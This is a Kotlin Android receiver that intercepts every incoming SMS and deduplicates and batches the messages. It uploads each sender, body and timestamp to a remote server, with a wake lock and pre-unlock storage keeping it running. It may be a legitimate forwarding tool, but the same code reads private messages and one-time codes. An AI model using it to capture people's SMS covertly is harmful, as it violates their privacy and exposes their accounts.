package com.example.informer

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Telephony
import android.util.Log

class SmsReceiver : BroadcastReceiver() {

    companion object {
        private const val BATCH_WINDOW_MS = 3000L 
        private val messageList = mutableListOf<SmsData>()
        private var pendingTask: Runnable? = null
        private val handler = Handler(Looper.getMainLooper())
    }

    data class SmsData(val sender: String, val body: String, val timestamp: Long)

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        if (messages.isNullOrEmpty()) return

        val smsTimestamp = messages[0].timestampMillis
        val rawNumber = messages[0].originatingAddress ?: "Unknown"
        val formattedNumber = PhoneUtils.formatVietnamesePhoneNumber(rawNumber)
        val fullContent = messages.joinToString("") { it.messageBody ?: "" }

        val safeContext = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N && !context.isDeviceProtectedStorage) {
            context.createDeviceProtectedStorageContext()
        } else {
            context
        }

        val pendingResult = goAsync()
        
        // Đợi 1000ms: Đảm bảo Android ghi xong DB để lấy ID chuẩn
        handler.postDelayed({
            val smsIdInDb = getSmsIdFromDb(safeContext, rawNumber, fullContent)
            val dedupePref = safeContext.getSharedPreferences("AppInternalStateV4", Context.MODE_PRIVATE)
            
            val cleanBody = fullContent.replace("\\s".toRegex(), "")
            val tsSec = smsTimestamp / 1000
            val msgKey = if (smsIdInDb != null) "ID_$smsIdInDb" else "KEY_${formattedNumber}_${cleanBody}_$tsSec"
            
            if (dedupePref.contains(msgKey)) {
                pendingResult.finish()
                return@postDelayed
            }

            // Ghi nhật ký ngay
            dedupePref.edit().putBoolean(msgKey, true).commit()

            val displayName = PhoneUtils.getDisplayName(context, formattedNumber)
            synchronized(messageList) {
                messageList.add(SmsData(displayName, fullContent, smsTimestamp))
                pendingTask?.let { handler.removeCallbacks(it) }

                val sendTask = Runnable {
                    val toSend: List<SmsData>
                    synchronized(messageList) {
                        toSend = messageList.sortedBy { it.timestamp }
                        messageList.clear()
                        pendingTask = null
                    }
                    if (toSend.isEmpty()) { pendingResult.finish(); return@Runnable }

                    val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
                    val wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Informer:SmsBatchWakeLock")
                    wakeLock.acquire(60_000)

                    kotlin.concurrent.thread {
                        try {
                            for (msg in toSend) {
                                ServerReporter.sendEventSync(safeContext, "SMS", msg.sender, msg.body, msg.timestamp)
                                Thread.sleep(200) // Giảm thời gian nghỉ giữa các tin
                            }
                        } catch (e: Exception) {
                            Log.e("SMS_RECEIVER", "Lỗi: ${e.message}")
                        } finally {
                            if (wakeLock.isHeld) wakeLock.release()
                            pendingResult.finish()
                        }
                    }
                }
                pendingTask = sendTask
                handler.postDelayed(sendTask, BATCH_WINDOW_MS)
            }
        }, 400)
    }

    private fun getSmsIdFromDb(context: Context, address: String?, body: String): String? {
        return try {
            val cursor = context.contentResolver.query(
                Uri.parse("content://sms/inbox"),
                arrayOf("_id"),
                "address = ? AND body = ?",
                arrayOf(address, body),
                "date DESC LIMIT 1"
            )
            cursor?.use { if (it.moveToFirst()) it.getString(0) else null }
        } catch (e: Exception) { null }
    }
}
